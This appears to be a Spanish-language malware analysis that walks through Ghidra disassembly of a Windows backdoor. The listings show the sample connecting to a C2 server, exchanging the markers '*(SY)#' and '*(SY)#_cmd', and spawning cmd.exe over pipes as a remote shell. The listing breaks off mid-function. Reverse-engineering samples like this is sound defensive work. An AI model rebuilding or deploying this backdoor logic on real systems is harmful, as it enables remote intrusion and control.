        00401580 68 4c 30        PUSH       s_*(SY)#_0040304c                                char * _Str2 for _strnicmp
                 40 00
        00401585 51              PUSH       ECX                                              char * _Str1 for _strnicmp
        00401586 e8 2b 07        CALL       MSVCRT.DLL::_strnicmp                            int _strnicmp(char * _Str1, char
                 00 00
        0040158b 83 c4 0c        ADD        ESP,0xc
        0040158e 85 c0           TEST       EAX,EAX
        00401590 75 5d           JNZ        LAB_004015ef
        00401592 6a 0a           PUSH       0xa                                              size_t _MaxCount for _strnicmp
        00401594 8d 54 24 5c     LEA        EDX,[ESP + 0x5c]
        00401598 68 40 30        PUSH       s_*(SY)#_cmd_00403040                            char * _Str2 for _strnicmp
                 40 00
        0040159d 52              PUSH       EDX                                              char * _Str1 for _strnicmp
        0040159e e8 13 07        CALL       MSVCRT.DLL::_strnicmp                            int _strnicmp(char * _Str1, char
                 00 00
        004015a3 83 c4 0c        ADD        ESP,0xc
        004015a6 85 c0           TEST       EAX,EAX
        004015a8 74 36           JZ         LAB_004015e0
        004015aa b9 3f 00        MOV        ECX,0x3f
                 00 00
        004015af 33 c0           XOR        EAX,EAX
        004015b1 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        004015b5 53              PUSH       EBX
        004015b6 f3 ab           STOSD.REP  ES:EDI
        004015b8 66 ab           STOSW      ES:EDI
        004015ba aa              STOSB      ES:EDI
        004015bb 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        004015bf 68 ff 00        PUSH       0xff
                 00 00
        004015c4 50              PUSH       EAX
        004015c5 55              PUSH       EBP
        004015c6 e8 a7 08        CALL       WS2_32.DLL::Ordinal_16                           undefined Ordinal_16()
                 00 00
        004015cb 83 f8 ff        CMP        EAX,-0x1
        004015ce 75 a2           JNZ        LAB_00401572
        004015d0 e8 7b 05        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
        004015d5 5f              POP        EDI
        004015d6 5e              POP        ESI
        004015d7 5d              POP        EBP
        004015d8 5b              POP        EBX
        004015d9 81 c4 dc        ADD        ESP,0x3dc
                 03 00 00
        004015df c3              RET
                             LAB_004015e0                                    XREF[1]:     004015a8(j)
        004015e0 55              PUSH       EBP                                              void * _ArgList for _beginthread
        004015e1 53              PUSH       EBX                                              uint _StackSize for _beginthread
        004015e2 68 f0 16        PUSH       _StartAddress_004016f0                           _StartAddress * _StartAddress fo
                 40 00
        004015e7 e8 c4 06        CALL       MSVCRT.DLL::_beginthread                         uintptr_t _beginthread(_StartAdd
                 00 00
        004015ec 83 c4 0c        ADD        ESP,0xc
                             LAB_004015ef                                    XREF[1]:     00401590(j)
        004015ef 53              PUSH       EBX                                              DWORD dwExitCode for ExitThread
        004015f0 ff 15 0c        CALL       dword ptr [->KERNEL32.DLL::ExitThread]           = 00002314
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
        004015f6 90 90 90        align      align(10)
                 90 90 90
                 90 90 90 90
```

üß† 1. Preparaci√≥n del entorno
```
00401320  SUB ESP,0x3dc
00401326  PUSH EBX
00401327  PUSH EBP
00401328  PUSH ESI
00401329  PUSH EDI
```
Reserva espacio en la pila y guarda registros.

üîç 2. Busca la posici√≥n del car√°cter ':' (0x3A) en una cadena
```
0040132a  PUSH 0x3a
0040132c  PUSH _Str_004030a0
00401331  CALL strchr
```
Busca : en una cadena, posiblemente una direcci√≥n IP con puerto (e.g., 127.0.0.1:8080), y calcula su posici√≥n.

üìã 3. Divide la cadena en dos partes
Separa la cadena en dos zonas:  
- Parte antes de : ‚Üí posible IP o dominio
- Parte despu√©s ‚Üí posible puerto

Se copian ambas partes a la pila (local_3a8, local_3bb, etc.).

üñ•Ô∏è 4. Obtiene el nombre del equipo
```
004013c2  CALL GetComputerNameA
```
Guarda el nombre del equipo en local_294.

üåê 5. Inicializa Winsock (WSAStartup)
```
004013fa  CALL Ordinal_115 ; WSAStartup
```

üîå 6. Crea un socket
```
00401404  CALL Ordinal_23 ; socket(AF_INET, SOCK_STREAM, 0)
```
Se guarda el resultado en EBP. Si falla, duerme un rato y vuelve a intentarlo.

üåç 7. Prepara la estructura sockaddr_in
```
0040143d  CALL atol ; convierte string a n√∫mero (puerto)
00401446  CALL Ordinal_9 ; inet_addr
```

ü´≥ 8. Conecta al host remoto
```
00401466  CALL Ordinal_4 ; connect
```
Si falla, repite el bucle.

üì° 9. Env√≠a la cadena ‚Äú*(SY)#‚Äù al host
```
00401491  MOV EDI,s_*(SY)#_00403060
...
00401506  CALL Ordinal_19 ; send
```
Puede ser una especie de handshake o identificador del malware.

üì• 10. Recibe comando del servidor
```
00401563  CALL Ordinal_16 ; recv
```
Si recibe *(SY)#_cmd, entonces:

```
004015e2  PUSH _StartAddress_004016f0
004015e7  CALL _beginthread
```
‚Üí Lanza un hilo (payload) al recibir el comando correcto. Hilo que lanza: 004016f0.

üí£ 11. Si no es v√°lido, termina
```
004015f0  CALL ExitThread
```

üí° Conclusi√≥n. Esta funci√≥n es el n√∫cleo del comportamiento de conexi√≥n remota del malware. Realiza:
- Resoluci√≥n de direcci√≥n/puerto desde un string.
- Obtenci√≥n del nombre del host.
- Inicializaci√≥n de Winsock.
- Conexi√≥n a un C2 (Command and Control).
- Env√≠o de identificador o saludo.
- Recepci√≥n de comandos del servidor.
- Si el comando es el esperado (*(SY)#_cmd), ejecuta un nuevo hilo (posible payload).
- Si no, termina el hilo.

Es un malware backdoor con C2 que espera instrucciones remotas para ejecutar payloads en forma de hilos.

------------------------
## Contenido desensamblado de la muestra de malware: .text ‚Üí Funci√≥n FUN_00401600


```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             PHANDLE __stdcall FUN_00401600(void)
                               assume FS_OFFSET = 0xffdff000
             PHANDLE           EAX:4          <RETURN>
             undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     00401654(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     0040164c(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[3]:     00401628(*),
                                                                                                   00401644(W),
                                                                                                   00401662(*)
             undefined4        Stack[-0x10]:4 local_10                                XREF[5]:     00401610(W),
                                                                                                   0040162e(*),
                                                                                                   00401684(R),
                                                                                                   004016b5(R),
                                                                                                   004016d7(R)
             undefined4        Stack[-0x14]:4 local_14                                XREF[5]:     00401608(W),
                                                                                                   00401669(*),
                                                                                                   00401698(R),
                                                                                                   004016b9(R),
                                                                                                   004016d0(R)
                             FUN_00401600                                    XREF[1]:     _StartAddress_004016f0:004016ff(
        00401600 83 ec 14        SUB        ESP,0x14
        00401603 53              PUSH       EBX
        00401604 56              PUSH       ESI
        00401605 57              PUSH       EDI
        00401606 6a 18           PUSH       0x18                                             size_t _Size for malloc
        00401608 c7 44 24        MOV        dword ptr [ESP + local_14],0x0
                 10 00 00
                 00 00
        00401610 c7 44 24        MOV        dword ptr [ESP + local_10],0x0
                 14 00 00
                 00 00
        00401618 e8 b7 06        CALL       MSVCRT.DLL::malloc                               void * malloc(size_t _Size)
                 00 00
        0040161d 8b 1d 18        MOV        EBX,dword ptr [->KERNEL32.DLL::CreatePipe]       = 0000233e
                 20 40 00
        00401623 83 c4 04        ADD        ESP,0x4
        00401626 8b f0           MOV        ESI,EAX
        00401628 8d 44 24 14     LEA        EAX=>local_c,[ESP + 0x14]
        0040162c 6a 00           PUSH       0x0                                              DWORD nSize for CreatePipe
        0040162e 8d 4c 24 14     LEA        ECX=>local_10,[ESP + 0x14]
        00401632 8d 7e 04        LEA        EDI,[ESI + 0x4]
        00401635 50              PUSH       EAX                                              LPSECURITY_ATTRIBUTES lpPipeAttr
        00401636 51              PUSH       ECX                                              PHANDLE hWritePipe for CreatePipe
        00401637 c7 06 00        MOV        dword ptr [ESI],0x0
                 00 00 00
        0040163d c7 07 00        MOV        dword ptr [EDI],0x0
                 00 00 00
        00401643 56              PUSH       ESI                                              PHANDLE hReadPipe for CreatePipe
        00401644 c7 44 24        MOV        dword ptr [ESP + local_c],0xc
                 24 0c 00
                 00 00
        0040164c c7 44 24        MOV        dword ptr [ESP + local_8],0x0
                 28 00 00
                 00 00
        00401654 c7 44 24        MOV        dword ptr [ESP + local_4],0x1
                 2c 01 00
                 00 00
        0040165c ff d3           CALL       EBX=>KERNEL32.DLL::CreatePipe
        0040165e 85 c0           TEST       EAX,EAX
        00401660 74 13           JZ         LAB_00401675
        00401662 8d 54 24 14     LEA        EDX=>local_c,[ESP + 0x14]
        00401666 6a 00           PUSH       0x0                                              DWORD nSize for CreatePipe
        00401668 52              PUSH       EDX                                              LPSECURITY_ATTRIBUTES lpPipeAttr
        00401669 8d 44 24 14     LEA        EAX=>local_14,[ESP + 0x14]
        0040166d 57              PUSH       EDI                                              PHANDLE hWritePipe for CreatePipe
        0040166e 50              PUSH       EAX                                              PHANDLE hReadPipe for CreatePipe
        0040166f ff d3           CALL       EBX=>KERNEL32.DLL::CreatePipe
        00401671 85 c0           TEST       EAX,EAX
        00401673 75 40           JNZ        LAB_004016b5
                             LAB_00401675                                    XREF[1]:     00401660(j)
        00401675 8b 06           MOV        EAX,dword ptr [ESI]
        00401677 8b 1d 00        MOV        EBX,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        0040167d 85 c0           TEST       EAX,EAX
        0040167f 74 03           JZ         LAB_00401684
        00401681 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        00401682 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_00401684                                    XREF[1]:     0040167f(j)
        00401684 8b 44 24 10     MOV        EAX,dword ptr [ESP + local_10]
        00401688 85 c0           TEST       EAX,EAX
        0040168a 74 03           JZ         LAB_0040168f
        0040168c 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        0040168d ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_0040168f                                    XREF[1]:     0040168a(j)
        0040168f 8b 3f           MOV        EDI,dword ptr [EDI]
        00401691 85 ff           TEST       EDI,EDI
        00401693 74 03           JZ         LAB_00401698
        00401695 57              PUSH       EDI                                              HANDLE hObject for CloseHandle
        00401696 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_00401698                                    XREF[1]:     00401693(j)
        00401698 8b 44 24 0c     MOV        EAX,dword ptr [ESP + local_14]
        0040169c 85 c0           TEST       EAX,EAX
        0040169e 74 03           JZ         LAB_004016a3
        004016a0 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        004016a1 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_004016a3                                    XREF[1]:     0040169e(j)
        004016a3 56              PUSH       ESI                                              void * _Memory for free
        004016a4 e8 25 06        CALL       MSVCRT.DLL::free                                 void free(void * _Memory)
                 00 00
        004016a9 83 c4 04        ADD        ESP,0x4
        004016ac 33 c0           XOR        EAX,EAX
        004016ae 5f              POP        EDI
        004016af 5e              POP        ESI
        004016b0 5b              POP        EBX
        004016b1 83 c4 14        ADD        ESP,0x14
        004016b4 c3              RET
                             LAB_004016b5                                    XREF[1]:     00401673(j)
        004016b5 8b 4c 24 10     MOV        ECX,dword ptr [ESP + local_10]
        004016b9 8b 54 24 0c     MOV        EDX,dword ptr [ESP + local_14]
        004016bd 51              PUSH       ECX
        004016be 52              PUSH       EDX
        004016bf e8 9c 01        CALL       FUN_00401860                                     HANDLE FUN_00401860(HANDLE param
                 00 00
        004016c4 8b 3d 00        MOV        EDI,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        004016ca 83 c4 08        ADD        ESP,0x8
        004016cd 89 46 08        MOV        dword ptr [ESI + 0x8],EAX
        004016d0 8b 44 24 0c     MOV        EAX,dword ptr [ESP + local_14]
        004016d4 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        004016d5 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        004016d7 8b 4c 24 10     MOV        ECX,dword ptr [ESP + local_10]
        004016db 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        004016dc ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        004016de 8b c6           MOV        EAX,ESI
        004016e0 5f              POP        EDI
        004016e1 5e              POP        ESI
        004016e2 5b              POP        EBX
        004016e3 83 c4 14        ADD        ESP,0x14
        004016e6 c3              RET
        004016e7 90 90 90        align      align(9)
                 90 90 90
                 90 90 90
                             **************************************************************
                             * _StartAddress parameter of _beginthread                    *
                             *                                                            *
                             **************************************************************
                             undefined __cdecl _StartAddress_004016f0(HANDLE param_1)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             HANDLE            Stack[0x4]:4   param_1                                 XREF[1]:     00401710(R)
             undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     004017a3(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     00401797(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     0040178c(W),
                                                                                                   00401793(*)
             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     00401733(W)
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     0040172b(W)
             undefined4        Stack[-0x18]:4 local_18                                XREF[3]:     0040171d(*),
                                                                                                   00401723(W),
                                                                                                   00401759(*)
             undefined1        Stack[-0x1c]:1 local_1c                                XREF[2]:     0040170a(*),
                                                                                                   00401755(*)
                             _StartAddress_004016f0                          XREF[1]:     FUN_00401320:004015e2(*)
        004016f0 83 ec 1c        SUB        ESP,0x1c
        004016f3 56              PUSH       ESI
        004016f4 57              PUSH       EDI
        004016f5 6a 18           PUSH       0x18                                             size_t _Size for malloc
        004016f7 e8 d8 05        CALL       MSVCRT.DLL::malloc                               void * malloc(size_t _Size)
                 00 00
        004016fc 83 c4 04        ADD        ESP,0x4
        004016ff e8 fc fe        CALL       FUN_00401600                                     PHANDLE FUN_00401600(void)
                 ff ff
        00401704 8b 3d 2c        MOV        EDI,dword ptr [->KERNEL32.DLL::CreateThread]     = 000023a2
                 20 40 00
        0040170a 8d 4c 24 08     LEA        ECX=>local_1c,[ESP + 0x8]
        0040170e 8b f0           MOV        ESI,EAX
        00401710 8b 44 24 28     MOV        EAX,dword ptr [ESP + param_1]
        00401714 51              PUSH       ECX                                              LPDWORD lpThreadId for CreateThr
        00401715 6a 00           PUSH       0x0                                              DWORD dwCreationFlags for Create
        00401717 56              PUSH       ESI                                              LPVOID lpParameter for CreateThr
        00401718 68 40 19        PUSH       lpStartAddress_00401940                          LPTHREAD_START_ROUTINE lpStartAd
                 40 00
        0040171d 8d 54 24 1c     LEA        EDX=>local_18,[ESP + 0x1c]
        00401721 6a 00           PUSH       0x0                                              SIZE_T dwStackSize for CreateThr
        00401723 c7 44 24        MOV        dword ptr [ESP + local_18],0xc
                 20 0c 00
                 00 00
        0040172b c7 44 24        MOV        dword ptr [ESP + local_14],0x0
                 24 00 00
                 00 00
        00401733 c7 44 24        MOV        dword ptr [ESP + local_10],0x0
                 28 00 00
                 00 00
        0040173b 52              PUSH       EDX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        0040173c 89 46 0c        MOV        dword ptr [ESI + 0xc],EAX
        0040173f ff d7           CALL       EDI=>KERNEL32.DLL::CreateThread
        00401741 85 c0           TEST       EAX,EAX
        00401743 89 46 10        MOV        dword ptr [ESI + 0x10],EAX
        00401746 75 0d           JNZ        LAB_00401755
        00401748 c7 46 0c        MOV        dword ptr [ESI + 0xc],0xffffffff
                 ff ff ff ff
        0040174f 5f              POP        EDI
        00401750 5e              POP        ESI
        00401751 83 c4 1c        ADD        ESP,0x1c
        00401754 c3              RET
                             LAB_00401755                                    XREF[1]:     00401746(j)
        00401755 8d 44 24 08     LEA        EAX=>local_1c,[ESP + 0x8]
        00401759 8d 4c 24 0c     LEA        ECX=>local_18,[ESP + 0xc]
        0040175d 50              PUSH       EAX                                              LPDWORD lpThreadId for CreateThr
        0040175e 6a 00           PUSH       0x0                                              DWORD dwCreationFlags for Create
        00401760 56              PUSH       ESI                                              LPVOID lpParameter for CreateThr
        00401761 68 70 1a        PUSH       lpStartAddress_00401a70                          LPTHREAD_START_ROUTINE lpStartAd
                 40 00
        00401766 6a 00           PUSH       0x0                                              SIZE_T dwStackSize for CreateThr
        00401768 51              PUSH       ECX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        00401769 ff d7           CALL       EDI=>KERNEL32.DLL::CreateThread
        0040176b 85 c0           TEST       EAX,EAX
        0040176d 89 46 14        MOV        dword ptr [ESI + 0x14],EAX
        00401770 75 15           JNZ        LAB_00401787
        00401772 50              PUSH       EAX                                              DWORD dwExitCode for TerminateTh
        00401773 50              PUSH       EAX                                              HANDLE hThread for TerminateThread
        00401774 c7 46 0c        MOV        dword ptr [ESI + 0xc],0xffffffff
                 ff ff ff ff
        0040177b ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        00401781 5f              POP        EDI
        00401782 5e              POP        ESI
        00401783 83 c4 1c        ADD        ESP,0x1c
        00401786 c3              RET
                             LAB_00401787                                    XREF[1]:     00401770(j)
        00401787 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        0040178a 6a ff           PUSH       -0x1                                             DWORD dwMilliseconds for WaitFor
        0040178c 89 54 24 1c     MOV        dword ptr [ESP + local_c],EDX
        00401790 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        00401793 8d 54 24 1c     LEA        EDX=>local_c,[ESP + 0x1c]
        00401797 89 44 24 20     MOV        dword ptr [ESP + local_8],EAX
        0040179b 8b 4e 08        MOV        ECX,dword ptr [ESI + 0x8]
        0040179e 6a 00           PUSH       0x0                                              BOOL bWaitAll for WaitForMultipl
        004017a0 52              PUSH       EDX                                              HANDLE * lpHandles for WaitForMu
        004017a1 6a 03           PUSH       0x3                                              DWORD nCount for WaitForMultiple
        004017a3 89 4c 24 30     MOV        dword ptr [ESP + local_4],ECX
        004017a7 ff 15 24        CALL       dword ptr [->KERNEL32.DLL::WaitForMultipleObje   = 00002376
                 20 40 00
        004017ad 83 e8 00        SUB        EAX,0x0
        004017b0 74 32           JZ         LAB_004017e4
        004017b2 48              DEC        EAX
        004017b3 74 1b           JZ         LAB_004017d0
        004017b5 48              DEC        EAX
        004017b6 75 44           JNZ        LAB_004017fc
        004017b8 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        004017bb 8b 3d 28        MOV        EDI,dword ptr [->KERNEL32.DLL::TerminateThread]  = 00002390
                 20 40 00
        004017c1 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017c3 50              PUSH       EAX                                              HANDLE hThread for TerminateThread
        004017c4 ff d7           CALL       EDI=>KERNEL32.DLL::TerminateThread
        004017c6 8b 4e 10        MOV        ECX,dword ptr [ESI + 0x10]
        004017c9 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017cb 51              PUSH       ECX                                              HANDLE hThread for TerminateThread
        004017cc ff d7           CALL       EDI=>KERNEL32.DLL::TerminateThread
        004017ce eb 2c           JMP        LAB_004017fc
                             LAB_004017d0                                    XREF[1]:     004017b3(j)
        004017d0 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        004017d3 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017d5 52              PUSH       EDX                                              HANDLE hThread for TerminateThread
        004017d6 ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        004017dc 8b 46 08        MOV        EAX,dword ptr [ESI + 0x8]
        004017df 6a 01           PUSH       0x1
        004017e1 50              PUSH       EAX
        004017e2 eb 12           JMP        LAB_004017f6
                             LAB_004017e4                                    XREF[1]:     004017b0(j)
        004017e4 8b 4e 14        MOV        ECX,dword ptr [ESI + 0x14]
        004017e7 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017e9 51              PUSH       ECX                                              HANDLE hThread for TerminateThread
        004017ea ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        004017f0 8b 56 08        MOV        EDX,dword ptr [ESI + 0x8]
        004017f3 6a 01           PUSH       0x1                                              UINT uExitCode for TerminateProc
        004017f5 52              PUSH       EDX                                              HANDLE hProcess for TerminatePro
                             LAB_004017f6                                    XREF[1]:     004017e2(j)
        004017f6 ff 15 20        CALL       dword ptr [->KERNEL32.DLL::TerminateProcess]     = 00002362
                 20 40 00
                             LAB_004017fc                                    XREF[2]:     004017b6(j), 004017ce(j)
        004017fc 8b 46 0c        MOV        EAX,dword ptr [ESI + 0xc]
        004017ff 53              PUSH       EBX
        00401800 50              PUSH       EAX
        00401801 e8 84 06        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401806 8b 0e           MOV        ECX,dword ptr [ESI]
        00401808 8b 1d 1c        MOV        EBX,dword ptr [->KERNEL32.DLL::DisconnectNamed   = 0000234c
                 20 40 00
        0040180e 51              PUSH       ECX                                              HANDLE hNamedPipe for Disconnect
        0040180f ff d3           CALL       EBX=>KERNEL32.DLL::DisconnectNamedPipe
        00401811 8b 16           MOV        EDX,dword ptr [ESI]
        00401813 8b 3d 00        MOV        EDI,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        00401819 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        0040181a ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040181c 8b 46 04        MOV        EAX,dword ptr [ESI + 0x4]
        0040181f 50              PUSH       EAX                                              HANDLE hNamedPipe for Disconnect
        00401820 ff d3           CALL       EBX=>KERNEL32.DLL::DisconnectNamedPipe
        00401822 8b 4e 04        MOV        ECX,dword ptr [ESI + 0x4]
        00401825 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401826 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        00401828 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        0040182b 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        0040182c ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040182e 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        00401831 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        00401832 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        00401834 8b 4e 08        MOV        ECX,dword ptr [ESI + 0x8]
        00401837 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401838 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040183a 85 f6           TEST       ESI,ESI
        0040183c 5b              POP        EBX
        0040183d 74 09           JZ         LAB_00401848
        0040183f 56              PUSH       ESI                                              void * _Memory for free
        00401840 e8 89 04        CALL       MSVCRT.DLL::free                                 void free(void * _Memory)
                 00 00
        00401845 83 c4 04        ADD        ESP,0x4
                             LAB_00401848                                    XREF[1]:     0040183d(j)
        00401848 e8 03 03        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
        0040184d 5f              POP        EDI
        0040184e 5e              POP        ESI
        0040184f 83 c4 1c        ADD        ESP,0x1c
        00401852 c3              RET
        00401853 90 90 90        align      align(13)
                 90 90 90
                 90 90 90
```

- Reserva memoria (0x18 bytes) con malloc.
- Prepara variables locales (local_14, local_10, etc.) con ceros y valores para SECURITY_ATTRIBUTES.
- Llama a CreatePipe para inicializar el primer pipe:
  - hReadPipe se guarda en ESI
  - hWritePipe se guarda en [ESI + 4]

- Si falla, cierra todos los handles abiertos y libera la memoria.
- Si tiene √©xito, crea un segundo pipe, guardando el nuevo hReadPipe en local_14 y el hWritePipe en local_10.
- Si esta segunda llamada tambi√©n es exitosa:
  - Llama a otra funci√≥n (FUN_00401860) pas√°ndole los dos HANDLEs (local_10 y local_14).
  - Guarda el resultado (otro HANDLE, posiblemente a un proceso/hilo/pipe especial) en [ESI + 8].
  - Cierra los HANDLEs local_10 y local_14, ya que la estructura tiene ahora su propio HANDLE.
- Devuelve ESI, un puntero a la estructura con los HANDLEs inicializados.

------------------------
## Contenido desensamblado de la muestra de malware: .text ‚Üí Funci√≥n FUN_00401860
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             HANDLE __cdecl FUN_00401860(HANDLE param_1, HANDLE param
                               assume FS_OFFSET = 0xffdff000
             HANDLE            EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   param_1                                 XREF[1]:     00401863(R)
             HANDLE            Stack[0x8]:4   param_2                                 XREF[1]:     00401869(R)
             undefined4        Stack[-0x4]:4  local_4                                 XREF[2]:     00401879(*),
                                                                                                   004018c2(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     004018be(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     004018ba(W)
             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     004018a9(W)
             undefined2        Stack[-0x12]:2 local_12                                XREF[1]:     004018ad(W)
             undefined2        Stack[-0x14]:2 local_14                                XREF[1]:     004018a4(W)
             undefined4        Stack[-0x18]:4 local_18                                XREF[1]:     004018b2(W)
             undefined4        Stack[-0x28]:4 local_28                                XREF[1]:     00401894(W)
             undefined4        Stack[-0x2c]:4 local_2c                                XREF[1]:     00401898(W)
             undefined4        Stack[-0x30]:4 local_30                                XREF[1]:     0040189c(W)
             undefined4        Stack[-0x34]:4 local_34                                XREF[1]:     004018a0(W)
             undefined4        Stack[-0x38]:4 local_38                                XREF[1]:     0040188c(W)
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00401890(W)
             undefined4        Stack[-0x40]:4 local_40                                XREF[1]:     00401888(W)
             undefined4        Stack[-0x44]:4 local_44                                XREF[1]:     00401880(W)
                             FUN_00401860                                    XREF[1]:     FUN_00401600:004016bf(c)
        00401860 83 ec 60        SUB        ESP,0x60
        00401863 8b 44 24 64     MOV        EAX,dword ptr [ESP + param_1]
        00401867 53              PUSH       EBX
        00401868 56              PUSH       ESI
        00401869 8b 74 24 70     MOV        ESI,dword ptr [ESP + param_2]
        0040186d 33 db           XOR        EBX,EBX
        0040186f 57              PUSH       EDI
        00401870 8b 3d 38        MOV        EDI,dword ptr [->KERNEL32.DLL::GetCurrentProce   = 000023d6
                 20 40 00
        00401876 53              PUSH       EBX                                              DWORD dwOptions for DuplicateHan
        00401877 6a 01           PUSH       0x1                                              BOOL bInheritHandle for Duplicat
        00401879 8d 4c 24 70     LEA        ECX=>local_4,[ESP + 0x70]
        0040187d 6a 02           PUSH       0x2                                              DWORD dwDesiredAccess for Duplic
        0040187f 51              PUSH       ECX                                              LPHANDLE lpTargetHandle for Dupl
        00401880 c7 44 24        MOV        dword ptr [ESP + local_44],0x44
                 38 44 00
                 00 00
        00401888 89 5c 24 3c     MOV        dword ptr [ESP + local_40],EBX
        0040188c 89 5c 24 44     MOV        dword ptr [ESP + local_38],EBX
        00401890 89 5c 24 40     MOV        dword ptr [ESP + local_3c],EBX
        00401894 89 5c 24 54     MOV        dword ptr [ESP + local_28],EBX
        00401898 89 5c 24 50     MOV        dword ptr [ESP + local_2c],EBX
        0040189c 89 5c 24 4c     MOV        dword ptr [ESP + local_30],EBX
        004018a0 89 5c 24 48     MOV        dword ptr [ESP + local_34],EBX
        004018a4 66 89 5c        MOV        word ptr [ESP + local_14],BX
                 24 68
        004018a9 89 5c 24 6c     MOV        dword ptr [ESP + local_10],EBX
        004018ad 66 89 5c        MOV        word ptr [ESP + local_12],BX
                 24 6a
        004018b2 c7 44 24        MOV        dword ptr [ESP + local_18],0x101
                 64 01 01
                 00 00
        004018ba 89 44 24 70     MOV        dword ptr [ESP + local_c],EAX
        004018be 89 74 24 74     MOV        dword ptr [ESP + local_8],ESI
        004018c2 89 74 24 78     MOV        dword ptr [ESP + local_4],ESI
        004018c6 ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        004018c8 50              PUSH       EAX                                              HANDLE hTargetProcessHandle for
        004018c9 56              PUSH       ESI                                              HANDLE hSourceHandle for Duplica
        004018ca ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        004018cc 50              PUSH       EAX                                              HANDLE hSourceProcessHandle for
        004018cd ff 15 34        CALL       dword ptr [->KERNEL32.DLL::DuplicateHandle]      = 000023c4
                 20 40 00
        004018d3 bf 68 30        MOV        EDI,s_cmd.exe_00403068                           = "cmd.exe"
                 40 00
        004018d8 83 c9 ff        OR         ECX,0xffffffff
        004018db 33 c0           XOR        EAX,EAX
        004018dd 8d 54 24 0c     LEA        EDX,[ESP + 0xc]
        004018e1 f2 ae           SCASB.RE   ES:EDI
        004018e3 f7 d1           NOT        ECX
        004018e5 2b f9           SUB        EDI,ECX
        004018e7 8b c1           MOV        EAX,ECX
        004018e9 8b f7           MOV        ESI,EDI
        004018eb 8b fa           MOV        EDI,EDX
        004018ed 8d 54 24 28     LEA        EDX,[ESP + 0x28]
        004018f1 c1 e9 02        SHR        ECX,0x2
        004018f4 f3 a5           MOVSD.REP  ES:EDI,ESI
        004018f6 8b c8           MOV        ECX,EAX
        004018f8 8d 44 24 0c     LEA        EAX,[ESP + 0xc]
        004018fc 83 e1 03        AND        ECX,0x3
        004018ff f3 a4           MOVSB.REP  ES:EDI,ESI
        00401901 8d 4c 24 18     LEA        ECX,[ESP + 0x18]
        00401905 51              PUSH       ECX                                              LPPROCESS_INFORMATION lpProcessI
        00401906 52              PUSH       EDX                                              LPSTARTUPINFOA lpStartupInfo for
        00401907 53              PUSH       EBX                                              LPCSTR lpCurrentDirectory for Cr
        00401908 53              PUSH       EBX                                              LPVOID lpEnvironment for CreateP
        00401909 53              PUSH       EBX                                              DWORD dwCreationFlags for Create
        0040190a 6a 01           PUSH       0x1                                              BOOL bInheritHandles for CreateP
